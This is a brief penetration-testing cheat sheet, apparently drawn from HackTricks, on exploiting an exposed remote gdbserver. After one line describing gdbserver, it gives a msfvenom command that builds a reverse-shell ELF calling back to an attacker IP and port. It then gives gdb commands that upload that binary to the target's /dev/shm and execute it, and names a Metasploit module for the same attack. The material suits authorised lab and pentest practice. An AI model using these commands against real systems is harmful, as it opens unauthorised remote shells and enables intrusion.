_____

**gdbserver** is a tool that enables the debugging of programs remotely. It runs alongside the program that needs debugging on the same system, known as the "target."

https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 PrependFork=true -f elf -o rev.elf
```

```
gdb -q rev.elf 
(gdb) target extended-remote 10.10.11.125:1337
(gdb) remote put rev.elf /dev/shm/rev
(gdb) set remote exec-file /dev/shm/rev
run
```


# Metasploit 

```
use multi/gdb/gdb_server_exec
```
